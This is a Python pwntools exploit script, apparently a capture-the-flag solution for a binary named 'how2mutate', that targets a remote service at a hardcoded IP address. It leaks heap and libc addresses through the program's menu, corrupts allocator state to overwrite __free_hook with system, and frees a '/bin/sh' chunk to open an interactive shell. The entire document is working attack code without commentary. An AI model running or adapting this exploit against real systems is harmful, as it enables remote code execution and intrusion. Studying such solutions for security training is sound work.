from pwn import *

context.log_level='debug'

#c = process("./how2mutate")
#c = remote('172.17.0.2',12345)
c = remote('111.186.59.27',12345)

c.sendlineafter('> ','1')
c.sendlineafter(': ','120')
c.sendlineafter(': ','a')
c.sendlineafter('> ','1')
c.sendlineafter(': ','0')
c.sendlineafter('> ','5')
c.sendlineafter(': ','0')
c.sendlineafter('> ','2')
c.sendlineafter(': ','1')
c.recvuntil('realloc(')
leak = c.recvuntil(', ')[:-2]
heap = int(leak,16)
print(hex(heap))

c.sendlineafter('> ','1')
c.sendlineafter(': ','0')
c.sendlineafter('> ','1')
c.sendlineafter(': ','0')
c.sendlineafter('> ','4')
c.sendlineafter(': ','0')
c.sendlineafter('> ','4')
c.sendlineafter(': ','1')

c.sendlineafter('> ','6')
import time
time.sleep(0.1)
#pause()
c.sendlineafter('> ','2')
c.sendlineafter(': ','2')

c.sendlineafter('> ','1')
c.sendlineafter(': ','8')
c.sendafter(': ',p64(heap-0x120))
c.sendlineafter('> ','1')
c.sendlineafter(': ','0')
time.sleep(1)
c.sendlineafter('> ','1')
c.sendlineafter(': ','10')
c.sendafter(': ',p64(heap+0x260))

c.sendlineafter('> ','3')
c.recvuntil('0: ')
leak = c.recvline().strip()
libc = u64(leak.ljust(8,b'\x00'))+0x197ba0
print(hex(libc))
#pause()

system = libc+0x30410
free_hook = libc+0x1c9b28

for i in range(8):
    c.sendlineafter('> ','1')
    c.sendlineafter(': ','8')
    c.sendafter(': ',str(i))
    
#pause()
seeds = p64(heap-0x120)
for i in range(8):
    seeds += p64(heap+0x370+i*0x20)
seeds += p64(heap+0x370)
c.sendlineafter('> ','4')
c.sendlineafter(': ','2')
c.sendlineafter('> ','1')
c.sendlineafter(': ','120')
c.sendafter(': ',seeds)

for i in range(2,9):
    c.sendlineafter('> ','4')
    c.sendlineafter(': ',str(i))

c.sendlineafter('> ','4')
c.sendlineafter(': ','1')

c.sendlineafter('> ','1')
c.sendlineafter(': ','8')
c.sendafter(': ','xxx')

c.sendlineafter('> ','4')
c.sendlineafter(': ','9')

c.sendlineafter('> ','1')
c.sendlineafter(': ','8')
c.sendafter(': ',p64(free_hook-0x10))
for i in range(6):
    c.sendlineafter('> ','1')
    c.sendlineafter(': ','8')
    c.sendafter(': ',str(i))

c.sendlineafter('> ','4')
c.sendlineafter(': ','0')
c.sendlineafter('> ','1')
c.sendlineafter(': ','120')
c.sendafter(': ',p64(heap-0x120))

c.sendlineafter('> ','1')
c.sendlineafter(': ','8')
c.sendafter(': ',"/bin/sh\x00")
c.sendlineafter('> ','1')
c.sendlineafter(': ','8')
c.sendafter(': ',p64(system))

c.sendlineafter('> ','4')
c.sendlineafter(': ','1')

c.interactive()

